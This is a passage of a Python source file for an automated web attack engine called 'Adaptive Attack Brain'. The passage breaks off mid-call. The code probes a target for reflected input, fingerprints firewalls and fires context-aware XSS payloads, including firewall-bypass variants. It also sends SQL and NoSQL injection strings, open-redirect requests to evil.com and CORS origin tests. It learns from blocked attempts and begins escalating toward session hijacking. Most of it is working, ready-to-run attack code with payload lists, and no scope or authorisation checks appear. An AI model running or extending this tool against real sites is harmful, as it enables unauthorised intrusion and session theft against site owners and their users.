"""
Adaptive Attack Brain
======================

A cognitive attack system that thinks, learns, and adapts in real-time.
Uses decision trees, pattern recognition, and contextual analysis.

This is the "brain" that makes intelligent decisions like an expert pentester:
- Observes responses and adapts strategy
- Recognizes patterns and exploits them
- Chains discoveries into complex attacks
- Generates contextual, targeted payloads
- Prioritizes based on likelihood of success

Author: canigetrichpls
"""

import asyncio
import json
import re
import hashlib
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Optional, Callable, Dict, List, Set, Tuple
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import structlog

logger = structlog.get_logger(__name__)


# =============================================================================
# COGNITIVE MODELS
# =============================================================================

class Observation(Enum):
    """What the brain observes from responses."""
    REFLECTION = auto()         # Input reflected in output
    ERROR_LEAKED = auto()       # Error message revealed info
    STATUS_CHANGE = auto()      # Different status code
    LENGTH_CHANGE = auto()      # Response length changed
    TIME_DELAY = auto()         # Response time anomaly
    REDIRECT = auto()           # Redirect occurred
    BLOCKED = auto()            # WAF/filter blocked
    SUCCESS = auto()            # Attack succeeded
    PARTIAL = auto()            # Partial success


class Confidence(Enum):
    """Confidence level in a finding."""
    CERTAIN = 100    # Definitely exploitable
    HIGH = 80        # Very likely exploitable
    MEDIUM = 60      # Probably exploitable
    LOW = 40         # Might be exploitable
    UNCERTAIN = 20   # Needs more testing


@dataclass
class Memory:
    """Brain's memory of what it learned."""
    # What we know about the target
    tech_stack: str = "unknown"
    waf_detected: str = ""
    blocked_patterns: List[str] = field(default_factory=list)
    working_payloads: List[str] = field(default_factory=list)
    
    # Response patterns
    normal_response_length: int = 0
    normal_response_time: float = 0.0
    error_signatures: List[str] = field(default_factory=list)
    
    # Discovered attack surface
    reflection_points: Dict[str, str] = field(default_factory=dict)  # param -> context
    injection_points: Dict[str, str] = field(default_factory=dict)   # param -> type
    auth_endpoints: List[str] = field(default_factory=list)
    api_patterns: List[str] = field(default_factory=list)
    
    # What worked and what didn't
    successful_attacks: List[dict] = field(default_factory=list)
    failed_attacks: List[dict] = field(default_factory=list)


@dataclass
class Thought:
    """A thought/decision by the brain."""
    action: str
    reasoning: str
    confidence: Confidence
    priority: int  # 1-10, higher = more important
    prerequisites: List[str] = field(default_factory=list)
    expected_outcome: str = ""


@dataclass
class Attack:
    """A generated attack with full context."""
    name: str
    type: str
    target: str
    payload: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Dict[str, str] = field(default_factory=dict)
    reasoning: str = ""
    expected_response: str = ""


@dataclass 
class ExploitResult:
    """Result of an exploitation attempt."""
    attack: Attack
    success: bool
    confidence: Confidence
    observations: List[Observation] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    poc: str = ""
    next_steps: List[str] = field(default_factory=list)


# =============================================================================
# THE BRAIN
# =============================================================================

class AdaptiveAttackBrain:
    """
    The cognitive center that makes intelligent attack decisions.
    
    Think of this as an expert pentester's brain:
    1. OBSERVE - Watch responses carefully
    2. ORIENT - Understand what the observations mean
    3. DECIDE - Choose the best attack strategy
    4. ACT - Execute the attack
    5. LEARN - Remember what worked
    """
    
    def __init__(self, http_client=None, rate_limiter=None):
        self.http_client = http_client
        self.rate_limiter = rate_limiter
        self.memory = Memory()
        self.thoughts: List[Thought] = []
        self.results: List[ExploitResult] = []
        self.target_url = ""
        
    # =========================================================================
    # MAIN COGNITIVE LOOP
    # =========================================================================
    
    async def analyze_and_exploit(
        self,
        target_url: str,
        initial_findings: List[dict] = None,
        max_iterations: int = 10,
    ) -> List[ExploitResult]:
        """
        Main cognitive loop - think and attack adaptively.
        """
        self.target_url = target_url
        initial_findings = initial_findings or []
        
        logger.info(f"[Brain] Initializing cognitive analysis of {target_url}")
        
        # Phase 1: Learn from initial findings
        await self._ingest_findings(initial_findings)
        
        # Phase 2: Baseline the target
        await self._establish_baseline()
        
        # Phase 3: Cognitive attack loop
        for iteration in range(max_iterations):
            logger.info(f"[Brain] Cognitive iteration {iteration + 1}/{max_iterations}")
            
            # Think - What should we try?
            thought = self._think()
            if not thought:
                logger.info("[Brain] No more promising attack vectors")
                break
            
            # Decide - Generate specific attack
            attack = self._decide(thought)
            if not attack:
                continue
            
            # Act - Execute the attack
            result = await self._act(attack)
            
            # Learn - Remember the outcome
            self._learn(result)
            
            # If successful, explore further
            if result.success:
                await self._explore_success(result)
        
        return self.results
    
    # =========================================================================
    # PHASE 1: LEARNING FROM INITIAL FINDINGS
    # =========================================================================
    
    async def _ingest_findings(self, findings: List[dict]):
        """Learn from initial scan findings."""
        logger.info(f"[Brain] Ingesting {len(findings)} initial findings")
        
        for finding in findings:
            finding_type = finding.get("type", "").lower()
            finding_name = finding.get("name", "").lower()
            evidence = finding.get("evidence", [])
            
            # Learn about security posture
            if "missing" in finding_type or "missing" in finding_name:
                self._learn_missing_protection(finding_name)
            
            # Learn from errors
            if "error" in finding_type:
                self._learn_from_errors(evidence)
            
            # Learn endpoints
            if "endpoint" in finding_type or "api" in finding_type:
                self._learn_endpoints(evidence)
            
            # Learn parameters
            if "parameter" in finding_type or "reflection" in finding_type:
                self._learn_parameters(finding)
    
    def _learn_missing_protection(self, name: str):
        """Learn what protections are missing."""
        if "csp" in name or "content-security" in name:
            self.thoughts.append(Thought(
                action="xss_without_csp",
                reasoning="CSP is missing, XSS payloads won't be blocked by browser",
                confidence=Confidence.HIGH,
                priority=9,
            ))
        
        if "x-frame" in name:
            self.thoughts.append(Thought(
                action="clickjacking",
                reasoning="X-Frame-Options missing, page can be framed",
                confidence=Confidence.HIGH,
                priority=7,
            ))
        
        if "cors" in name:
            self.thoughts.append(Thought(
                action="cors_exploitation",
                reasoning="CORS misconfiguration detected",
                confidence=Confidence.HIGH,
                priority=9,
            ))
    
    def _learn_from_errors(self, evidence: list):
        """Extract intelligence from error messages."""
        error_patterns = {
            r"mysql|mariadb": ("mysql", "sqli"),
            r"postgres": ("postgresql", "sqli"),
            r"sqlite": ("sqlite", "sqli"),
            r"oracle": ("oracle", "sqli"),
            r"mssql|sql server": ("mssql", "sqli"),
            r"mongodb|bson": ("mongodb", "nosqli"),
            r"\.php|laravel|symfony": ("php", None),
            r"\.asp|\.net|iis": ("aspnet", None),
            r"django|flask|python": ("python", None),
            r"express|node": ("nodejs", None),
            r"stack trace|exception|error at": (None, "info_leak"),
        }
        
        for item in evidence:
            item_str = str(item).lower()
            for pattern, (tech, attack_type) in error_patterns.items():
                if re.search(pattern, item_str, re.I):
                    if tech:
                        self.memory.tech_stack = tech
                        logger.info(f"[Brain] Detected tech stack: {tech}")
                    if attack_type:
                        self.thoughts.append(Thought(
                            action=f"targeted_{attack_type}",
                            reasoning=f"Error revealed {tech or 'vulnerability'}, trying {attack_type}",
                            confidence=Confidence.HIGH,
                            priority=10,
                        ))
    
    def _learn_endpoints(self, evidence: list):
        """Learn about discovered endpoints."""
        for item in evidence:
            if isinstance(item, str) and "/" in item:
                self.memory.api_patterns.append(item)
                
                # Identify interesting endpoints
                if any(p in item.lower() for p in ["admin", "manage", "internal"]):
                    self.thoughts.append(Thought(
                        action="auth_bypass",
                        reasoning=f"Sensitive endpoint found: {item}",
                        confidence=Confidence.MEDIUM,
                        priority=8,
                    ))
                
                if any(p in item.lower() for p in ["user", "account", "profile"]):
                    self.thoughts.append(Thought(
                        action="idor_test",
                        reasoning=f"User-related endpoint: {item}",
                        confidence=Confidence.MEDIUM,
                        priority=7,
                    ))
    
    def _learn_parameters(self, finding: dict):
        """Learn about discovered parameters."""
        params = finding.get("parameters", [])
        endpoint = finding.get("endpoint", self.target_url)
        
        for param in params:
            param_lower = param.lower()
            
            # Classify parameter by name
            if any(p in param_lower for p in ["id", "uid", "user", "account"]):
                self.memory.injection_points[param] = "idor"
                self.thoughts.append(Thought(
                    action="idor_test",
                    reasoning=f"ID parameter '{param}' may be vulnerable to IDOR",
                    confidence=Confidence.MEDIUM,
                    priority=8,
                ))
            
            elif any(p in param_lower for p in ["search", "query", "q", "keyword"]):
                self.memory.injection_points[param] = "xss"
                self.thoughts.append(Thought(
                    action="xss_test",
                    reasoning=f"Search parameter '{param}' likely reflects input",
                    confidence=Confidence.HIGH,
                    priority=9,
                ))
            
            elif any(p in param_lower for p in ["url", "redirect", "return", "next"]):
                self.memory.injection_points[param] = "redirect"
                self.thoughts.append(Thought(
                    action="open_redirect",
                    reasoning=f"Redirect parameter '{param}' found",
                    confidence=Confidence.HIGH,
                    priority=6,
                ))
    
    # =========================================================================
    # PHASE 2: BASELINE ESTABLISHMENT
    # =========================================================================
    
    async def _establish_baseline(self):
        """Establish baseline behavior of the target."""
        if not self.http_client:
            return
        
        logger.info("[Brain] Establishing baseline...")
        
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            # Get normal response
            start = datetime.now()
            response = await self.http_client.get(self.target_url)
            elapsed = (datetime.now() - start).total_seconds()
            
            self.memory.normal_response_length = len(response.text)
            self.memory.normal_response_time = elapsed
            
            # Detect WAF
            await self._detect_waf()
            
            # Probe for reflections
            await self._probe_reflections()
            
            logger.info(f"[Brain] Baseline: len={self.memory.normal_response_length}, time={elapsed:.2f}s")
            
        except Exception as e:
            logger.error(f"[Brain] Baseline error: {e}")
    
    async def _detect_waf(self):
        """Detect Web Application Firewall."""
        waf_triggers = [
            "<script>alert(1)</script>",
            "' OR 1=1--",
            "../../../etc/passwd",
            "{{constructor.constructor('return this')()}}",
        ]
        
        waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare"],
            "akamai": ["akamai", "ghost"],
            "aws_waf": ["aws", "x-amz"],
            "imperva": ["imperva", "incapsula"],
            "f5": ["f5", "big-ip"],
            "modsecurity": ["mod_security", "modsec"],
        }
        
        for trigger in waf_triggers:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                response = await self.http_client.get(
                    f"{self.target_url}?test={quote(trigger)}"
                )
                
                # Check for WAF block
                if response.status_code in [403, 406, 429, 503]:
                    headers_str = str(response.headers).lower()
                    body_lower = response.text.lower()
                    
                    for waf, signatures in waf_signatures.items():
                        if any(s in headers_str or s in body_lower for s in signatures):
                            self.memory.waf_detected = waf
                            self.memory.blocked_patterns.append(trigger)
                            logger.info(f"[Brain] WAF detected: {waf}")
                            return
                    
                    # Generic WAF
                    self.memory.waf_detected = "unknown"
                    self.memory.blocked_patterns.append(trigger)
                    
            except Exception:
                pass
    
    async def _probe_reflections(self):
        """Find where input is reflected."""
        canary = f"BRAINPROBE{hashlib.md5(str(datetime.now()).encode()).hexdigest()[:8]}"
        
        # Common parameter names to test
        test_params = ["q", "search", "id", "name", "input", "data", "query", "keyword"]
        
        for param in test_params:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                test_url = f"{self.target_url}?{param}={canary}"
                response = await self.http_client.get(test_url)
                
                if canary in response.text:
                    # Analyze reflection context
                    context = self._analyze_reflection_context(response.text, canary)
                    self.memory.reflection_points[param] = context
                    
                    logger.info(f"[Brain] Reflection found: {param} in {context}")
                    
                    # Add thought based on context
                    self._add_reflection_thought(param, context)
                    
            except Exception:
                pass
    
    def _analyze_reflection_context(self, html: str, canary: str) -> str:
        """Determine where the canary was reflected."""
        pos = html.find(canary)
        if pos == -1:
            return "unknown"
        
        # Get surrounding context
        start = max(0, pos - 50)
        end = min(len(html), pos + len(canary) + 50)
        context = html[start:end]
        
        # Analyze context
        if re.search(rf'<script[^>]*>.*{canary}', context, re.I):
            return "script_block"
        elif re.search(rf'on\w+\s*=\s*["\'][^"\']*{canary}', context, re.I):
            return "event_handler"
        elif re.search(rf'href\s*=\s*["\'][^"\']*{canary}', context, re.I):
            return "href_attribute"
        elif re.search(rf'src\s*=\s*["\'][^"\']*{canary}', context, re.I):
            return "src_attribute"
        elif re.search(rf'<[^>]+\s+\w+\s*=\s*["\'][^"\']*{canary}[^"\']*["\']', context, re.I):
            return "attribute_value"
        elif re.search(rf'>[^<]*{canary}[^<]*<', context, re.I):
            return "html_body"
        else:
            return "unknown_context"
    
    def _add_reflection_thought(self, param: str, context: str):
        """Add appropriate thought based on reflection context."""
        context_payloads = {
            "script_block": {
                "action": "xss_script_context",
                "reasoning": f"Input reflected inside <script> tag, can inject JS directly",
                "priority": 10,
            },
            "event_handler": {
                "action": "xss_event_context",
                "reasoning": f"Input reflected in event handler, need to break out",
                "priority": 9,
            },
            "href_attribute": {
                "action": "xss_href_context",
                "reasoning": f"Input in href, try javascript: protocol",
                "priority": 8,
            },
            "attribute_value": {
                "action": "xss_attribute_context",
                "reasoning": f"Input in attribute, try to break out with quotes",
                "priority": 8,
            },
            "html_body": {
                "action": "xss_body_context",
                "reasoning": f"Input in HTML body, inject tags directly",
                "priority": 9,
            },
        }
        
        if context in context_payloads:
            config = context_payloads[context]
            self.thoughts.append(Thought(
                action=config["action"],
                reasoning=config["reasoning"],
                confidence=Confidence.HIGH,
                priority=config["priority"],
                prerequisites=[f"reflection_in_{param}"],
            ))
    
    # =========================================================================
    # PHASE 3: COGNITIVE LOOP - THINK
    # =========================================================================
    
    def _think(self) -> Optional[Thought]:
        """
        Think about what to try next.
        Returns the highest priority untried thought.
        """
        # Filter out already tried thoughts
        untried = [t for t in self.thoughts if not self._thought_already_tried(t)]
        
        if not untried:
            # Generate new thoughts based on what we learned
            self._generate_new_thoughts()
            untried = [t for t in self.thoughts if not self._thought_already_tried(t)]
        
        if not untried:
            return None
        
        # Sort by priority and confidence
        untried.sort(key=lambda t: (t.priority, t.confidence.value), reverse=True)
        
        thought = untried[0]
        logger.info(f"[Brain] Thinking: {thought.action} ({thought.reasoning})")
        
        return thought
    
    def _thought_already_tried(self, thought: Thought) -> bool:
        """Check if we already tried this thought."""
        for result in self.results:
            if result.attack.type == thought.action:
                return True
        return False
    
    def _generate_new_thoughts(self):
        """Generate new thoughts based on accumulated knowledge."""
        # If we found reflections but haven't tried XSS
        for param, context in self.memory.reflection_points.items():
            if not any(t.action.startswith("xss") for t in self.thoughts):
                self.thoughts.append(Thought(
                    action="xss_adaptive",
                    reasoning=f"Reflection in {param} ({context}) not yet exploited",
                    confidence=Confidence.HIGH,
                    priority=9,
                ))
        
        # If we have working payloads, try variations
        for payload in self.memory.working_payloads:
            self.thoughts.append(Thought(
                action="payload_variation",
                reasoning=f"Successful payload '{payload[:20]}...' - try variations",
                confidence=Confidence.MEDIUM,
                priority=6,
            ))
    
    # =========================================================================
    # PHASE 3: COGNITIVE LOOP - DECIDE
    # =========================================================================
    
    def _decide(self, thought: Thought) -> Optional[Attack]:
        """
        Decide on a specific attack based on the thought.
        Generates context-aware payloads.
        """
        logger.info(f"[Brain] Deciding attack for: {thought.action}")
        
        # Get the appropriate attack generator
        generators = {
            "xss_without_csp": self._generate_xss_attack,
            "xss_script_context": self._generate_xss_script_context,
            "xss_event_context": self._generate_xss_event_context,
            "xss_href_context": self._generate_xss_href_context,
            "xss_attribute_context": self._generate_xss_attribute_context,
            "xss_body_context": self._generate_xss_body_context,
            "xss_adaptive": self._generate_xss_adaptive,
            "xss_test": self._generate_xss_attack,
            "clickjacking": self._generate_clickjacking_attack,
            "cors_exploitation": self._generate_cors_attack,
            "idor_test": self._generate_idor_attack,
            "open_redirect": self._generate_redirect_attack,
            "auth_bypass": self._generate_auth_bypass_attack,
            "targeted_sqli": self._generate_sqli_attack,
            "targeted_nosqli": self._generate_nosqli_attack,
        }
        
        generator = generators.get(thought.action)
        if generator:
            return generator(thought)
        
        return None
    
    def _generate_xss_attack(self, thought: Thought) -> Attack:
        """Generate XSS attack with context-aware payloads."""
        # Choose payload based on what we know
        payloads = self._get_smart_xss_payloads()
        
        # Find best parameter
        param = self._get_best_param_for_xss()
        
        return Attack(
            name="Context-Aware XSS",
            type="xss_without_csp",
            target=f"{self.target_url}?{param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning=thought.reasoning,
            expected_response="Payload reflected and executed",
        )
    
    def _generate_xss_script_context(self, thought: Thought) -> Attack:
        """XSS when reflected inside <script> tag."""
        payloads = [
            "';alert(1)//",
            "\";alert(1)//",
            "</script><script>alert(1)</script>",
            "-alert(1)-",
            "}-alert(1)-{",
        ]
        param = self._get_reflection_param()
        
        return Attack(
            name="XSS in Script Context",
            type="xss_script_context",
            target=f"{self.target_url}?{param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning="Breaking out of JavaScript string/context",
        )
    
    def _generate_xss_event_context(self, thought: Thought) -> Attack:
        """XSS when reflected in event handler."""
        payloads = [
            "'-alert(1)-'",
            "\"onmouseover=alert(1)//",
            "' onfocus=alert(1) autofocus='",
        ]
        param = self._get_reflection_param()
        
        return Attack(
            name="XSS in Event Handler",
            type="xss_event_context",
            target=f"{self.target_url}?{param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning="Breaking out of event handler attribute",
        )
    
    def _generate_xss_href_context(self, thought: Thought) -> Attack:
        """XSS when reflected in href attribute."""
        payloads = [
            "javascript:alert(1)",
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
        ]
        param = self._get_reflection_param()
        
        return Attack(
            name="XSS via JavaScript Protocol",
            type="xss_href_context",
            target=f"{self.target_url}?{param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning="Using javascript: protocol in href",
        )
    
    def _generate_xss_attribute_context(self, thought: Thought) -> Attack:
        """XSS when reflected in attribute value."""
        payloads = [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '"><script>alert(1)</script>',
            "' autofocus onfocus='alert(1)",
        ]
        param = self._get_reflection_param()
        
        return Attack(
            name="XSS Attribute Breakout",
            type="xss_attribute_context",
            target=f"{self.target_url}?{param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning="Breaking out of HTML attribute",
        )
    
    def _generate_xss_body_context(self, thought: Thought) -> Attack:
        """XSS when reflected in HTML body."""
        # Check if WAF detected and adapt
        payloads = self._get_smart_xss_payloads()
        param = self._get_reflection_param()
        
        return Attack(
            name="XSS in HTML Body",
            type="xss_body_context",
            target=f"{self.target_url}?{param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning="Direct tag injection in HTML body",
        )
    
    def _generate_xss_adaptive(self, thought: Thought) -> Attack:
        """Adaptive XSS based on all knowledge."""
        # Use most promising reflection point
        best_param = None
        best_context = None
        
        for param, context in self.memory.reflection_points.items():
            if context in ["script_block", "event_handler"]:
                best_param = param
                best_context = context
                break
            elif not best_param:
                best_param = param
                best_context = context
        
        if not best_param:
            best_param = "q"
            best_context = "unknown"
        
        payloads = self._get_context_payloads(best_context)
        
        return Attack(
            name=f"Adaptive XSS ({best_context})",
            type="xss_adaptive",
            target=f"{self.target_url}?{best_param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning=f"Targeting {best_param} in {best_context} context",
        )
    
    def _generate_clickjacking_attack(self, thought: Thought) -> Attack:
        """Generate clickjacking PoC."""
        return Attack(
            name="Clickjacking",
            type="clickjacking",
            target=self.target_url,
            payload=f'<iframe src="{self.target_url}"></iframe>',
            reasoning="X-Frame-Options missing, page can be framed",
        )
    
    def _generate_cors_attack(self, thought: Thought) -> Attack:
        """Generate CORS exploitation attack."""
        return Attack(
            name="CORS Data Theft",
            type="cors_exploitation",
            target=self.target_url,
            payload="fetch with credentials",
            headers={"Origin": "https://evil.com"},
            reasoning="CORS allows arbitrary origins",
        )
    
    def _generate_idor_attack(self, thought: Thought) -> Attack:
        """Generate IDOR attack."""
        # Find ID parameters
        id_params = [p for p, t in self.memory.injection_points.items() if t == "idor"]
        param = id_params[0] if id_params else "id"
        
        return Attack(
            name=f"IDOR via {param}",
            type="idor_test",
            target=f"{self.target_url}?{param}=1",
            payload="1, 2, 0, -1",
            reasoning=f"Testing object reference manipulation on {param}",
        )
    
    def _generate_redirect_attack(self, thought: Thought) -> Attack:
        """Generate open redirect attack."""
        redirect_params = [p for p, t in self.memory.injection_points.items() if t == "redirect"]
        param = redirect_params[0] if redirect_params else "redirect"
        
        return Attack(
            name=f"Open Redirect via {param}",
            type="open_redirect",
            target=f"{self.target_url}?{param}=https://evil.com",
            payload="https://evil.com",
            reasoning="Testing redirect manipulation",
        )
    
    def _generate_auth_bypass_attack(self, thought: Thought) -> Attack:
        """Generate auth bypass attack."""
        endpoint = self.memory.auth_endpoints[0] if self.memory.auth_endpoints else "/admin"
        
        return Attack(
            name="Auth Bypass",
            type="auth_bypass",
            target=urljoin(self.target_url, endpoint),
            payload="Access without credentials",
            reasoning="Testing unauthenticated access to protected endpoint",
        )
    
    def _generate_sqli_attack(self, thought: Thought) -> Attack:
        """Generate SQL injection attack based on detected DB."""
        db = self.memory.tech_stack
        
        payloads = {
            "mysql": ["' OR '1'='1", "' UNION SELECT NULL,@@version--"],
            "postgresql": ["' OR '1'='1", "' UNION SELECT NULL,version()--"],
            "mssql": ["' OR '1'='1", "'; WAITFOR DELAY '0:0:5'--"],
            "oracle": ["' OR '1'='1", "' UNION SELECT NULL,banner FROM v$version--"],
            "unknown": ["' OR '1'='1", "1 OR 1=1"],
        }
        
        db_payloads = payloads.get(db, payloads["unknown"])
        param = self._get_best_param_for_sqli()
        
        return Attack(
            name=f"SQLi ({db})",
            type="targeted_sqli",
            target=f"{self.target_url}?{param}={quote(db_payloads[0])}",
            payload=db_payloads[0],
            reasoning=f"SQL injection targeting {db} database",
        )
    
    def _generate_nosqli_attack(self, thought: Thought) -> Attack:
        """Generate NoSQL injection attack."""
        payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            "[$ne]=1",
        ]
        param = self._get_best_param_for_sqli()
        
        return Attack(
            name="NoSQL Injection",
            type="targeted_nosqli",
            target=f"{self.target_url}?{param}={quote(payloads[0])}",
            payload=payloads[0],
            reasoning="NoSQL injection for MongoDB/similar",
        )
    
    # =========================================================================
    # HELPER METHODS FOR PAYLOAD GENERATION
    # =========================================================================
    
    def _get_smart_xss_payloads(self) -> List[str]:
        """Get XSS payloads adapted to target."""
        # Base payloads
        base = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]
        
        # If WAF detected, use bypass payloads
        if self.memory.waf_detected:
            bypass = [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror=alert`1`>",
                "<svg/onload=alert(1)>",
                "<%00script>alert(1)</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
                "<svg onload=alert&#40;1&#41;>",
            ]
            # Put bypass payloads first
            return bypass + base
        
        # If we know blocked patterns, avoid them
        if self.memory.blocked_patterns:
            # Filter out blocked patterns
            safe = []
            for p in base:
                blocked = False
                for blocked_pattern in self.memory.blocked_patterns:
                    if blocked_pattern.lower() in p.lower():
                        blocked = True
                        break
                if not blocked:
                    safe.append(p)
            
            if safe:
                return safe
        
        return base
    
    def _get_context_payloads(self, context: str) -> List[str]:
        """Get payloads specific to reflection context."""
        context_payloads = {
            "script_block": ["';alert(1)//", "\";alert(1)//", "</script><script>alert(1)</script>"],
            "event_handler": ["'-alert(1)-'", "\"onmouseover=alert(1)//"],
            "href_attribute": ["javascript:alert(1)", "javascript:alert(document.domain)"],
            "src_attribute": ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
            "attribute_value": ['"><script>alert(1)</script>', "' autofocus onfocus='alert(1)"],
            "html_body": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "unknown_context": ["<script>alert(1)</script>", '"><script>alert(1)</script>'],
        }
        return context_payloads.get(context, context_payloads["unknown_context"])
    
    def _get_reflection_param(self) -> str:
        """Get the best parameter for reflection testing."""
        if self.memory.reflection_points:
            return list(self.memory.reflection_points.keys())[0]
        return "q"
    
    def _get_best_param_for_xss(self) -> str:
        """Get the best parameter for XSS testing."""
        # First, check known reflection points
        if self.memory.reflection_points:
            return list(self.memory.reflection_points.keys())[0]
        
        # Then check injection points marked for XSS
        xss_params = [p for p, t in self.memory.injection_points.items() if t == "xss"]
        if xss_params:
            return xss_params[0]
        
        return "q"
    
    def _get_best_param_for_sqli(self) -> str:
        """Get the best parameter for SQLi testing."""
        sqli_params = [p for p, t in self.memory.injection_points.items() if t in ["sqli", "idor"]]
        if sqli_params:
            return sqli_params[0]
        return "id"
    
    # =========================================================================
    # PHASE 3: COGNITIVE LOOP - ACT
    # =========================================================================
    
    async def _act(self, attack: Attack) -> ExploitResult:
        """Execute the attack and observe results."""
        logger.info(f"[Brain] Executing: {attack.name}")
        
        result = ExploitResult(
            attack=attack,
            success=False,
            confidence=Confidence.UNCERTAIN,
        )
        
        if not self.http_client:
            return result
        
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            # Execute based on attack type
            if attack.type == "clickjacking":
                result = await self._execute_clickjacking(attack)
            elif attack.type == "cors_exploitation":
                result = await self._execute_cors(attack)
            else:
                result = await self._execute_injection(attack)
            
        except Exception as e:
            logger.error(f"[Brain] Attack error: {e}")
            result.evidence["error"] = str(e)
        
        self.results.append(result)
        return result
    
    async def _execute_injection(self, attack: Attack) -> ExploitResult:
        """Execute injection-type attack (XSS, SQLi, etc.)."""
        result = ExploitResult(attack=attack, success=False, confidence=Confidence.UNCERTAIN)
        
        start = datetime.now()
        response = await self.http_client.get(attack.target, headers=attack.headers)
        elapsed = (datetime.now() - start).total_seconds()
        
        # Observe the response
        observations = self._observe_response(response, attack, elapsed)
        result.observations = observations
        
        # Analyze success
        if Observation.REFLECTION in observations:
            if attack.payload in response.text:
                result.success = True
                result.confidence = Confidence.HIGH
                result.evidence = {
                    "url": attack.target,
                    "payload": attack.payload,
                    "reflected": True,
                    "context": self._get_payload_context(response.text, attack.payload),
                }
                result.poc = self._generate_poc(attack, response)
                result.next_steps = ["Try more complex payloads", "Check if executes"]
        
        if Observation.ERROR_LEAKED in observations:
            result.success = True
            result.confidence = Confidence.MEDIUM
            result.evidence["error_based"] = True
        
        if Observation.TIME_DELAY in observations:
            # Potential blind injection
            result.confidence = Confidence.MEDIUM
            result.evidence["time_based"] = True
            result.next_steps = ["Confirm with different delay", "Extract data"]
        
        if Observation.BLOCKED in observations:
            result.evidence["blocked"] = True
            result.next_steps = ["Try bypass techniques", "Use encoding"]
        
        return result
    
    async def _execute_clickjacking(self, attack: Attack) -> ExploitResult:
        """Execute clickjacking verification."""
        result = ExploitResult(attack=attack, success=False, confidence=Confidence.UNCERTAIN)
        
        response = await self.http_client.get(attack.target)
        headers = {k.lower(): v for k, v in response.headers.items()}
        
        # Check for frame protection
        has_xframe = "x-frame-options" in headers
        csp = headers.get("content-security-policy", "")
        has_frame_ancestors = "frame-ancestors" in csp
        
        if not has_xframe and not has_frame_ancestors:
            result.success = True
            result.confidence = Confidence.CERTAIN
            result.evidence = {
                "x_frame_options": "missing",
                "frame_ancestors": "not set",
            }
            result.poc = self._generate_clickjacking_poc(attack.target)
        
        return result
    
    async def _execute_cors(self, attack: Attack) -> ExploitResult:
        """Execute CORS verification."""
        result = ExploitResult(attack=attack, success=False, confidence=Confidence.UNCERTAIN)
        
        origins = ["https://evil.com", "null", "https://attacker.com"]
        
        for origin in origins:
            response = await self.http_client.get(
                attack.target,
                headers={"Origin": origin}
            )
            
            acao = response.headers.get("Access-Control-Allow-Origin", "")
            acac = response.headers.get("Access-Control-Allow-Credentials", "")
            
            if origin in acao or acao == "*":
                result.success = True
                result.confidence = Confidence.CERTAIN if acac.lower() == "true" else Confidence.HIGH
                result.evidence = {
                    "origin_tested": origin,
                    "acao": acao,
                    "acac": acac,
                    "credentials_allowed": acac.lower() == "true",
                }
                result.poc = self._generate_cors_poc(attack.target, origin)
                break
        
        return result
    
    def _observe_response(
        self,
        response,
        attack: Attack,
        elapsed: float,
    ) -> List[Observation]:
        """Observe response and classify what happened."""
        observations = []
        
        # Check for reflection
        if attack.payload in response.text:
            observations.append(Observation.REFLECTION)
        
        # Check for errors
        error_patterns = [
            r"error", r"exception", r"warning", r"syntax",
            r"mysql", r"postgres", r"sql", r"oracle",
            r"stack trace", r"at line \d+",
        ]
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.I):
                observations.append(Observation.ERROR_LEAKED)
                break
        
        # Check response length change
        if abs(len(response.text) - self.memory.normal_response_length) > 100:
            observations.append(Observation.LENGTH_CHANGE)
        
        # Check time delay (blind injection indicator)
        if elapsed > self.memory.normal_response_time + 3:
            observations.append(Observation.TIME_DELAY)
        
        # Check for blocks
        if response.status_code in [403, 406, 429, 503]:
            observations.append(Observation.BLOCKED)
        
        # Check for redirects
        if response.status_code in [301, 302, 303, 307, 308]:
            observations.append(Observation.REDIRECT)
        
        return observations
    
    def _get_payload_context(self, html: str, payload: str) -> str:
        """Get the context where payload was reflected."""
        pos = html.find(payload)
        if pos == -1:
            return "not_found"
        
        start = max(0, pos - 100)
        end = min(len(html), pos + len(payload) + 100)
        return html[start:end]
    
    # =========================================================================
    # PHASE 3: COGNITIVE LOOP - LEARN
    # =========================================================================
    
    def _learn(self, result: ExploitResult):
        """Learn from the attack result."""
        if result.success:
            self.memory.successful_attacks.append({
                "type": result.attack.type,
                "payload": result.attack.payload,
                "target": result.attack.target,
            })
            self.memory.working_payloads.append(result.attack.payload)
            logger.info(f"[Brain] SUCCESS: {result.attack.name}")
        else:
            self.memory.failed_attacks.append({
                "type": result.attack.type,
                "payload": result.attack.payload,
                "reason": result.observations,
            })
            
            # Learn from failure
            if Observation.BLOCKED in result.observations:
                self.memory.blocked_patterns.append(result.attack.payload)
                logger.info(f"[Brain] Blocked pattern learned: {result.attack.payload[:30]}...")
    
    async def _explore_success(self, result: ExploitResult):
        """When attack succeeds, explore further opportunities."""
        logger.info(f"[Brain] Exploring from success: {result.attack.name}")
        
        # If XSS found, try to escalate
        if "xss" in result.attack.type:
            # Add thoughts for XSS escalation
            self.thoughts.append(Thought(
                action="xss_session_hijack",
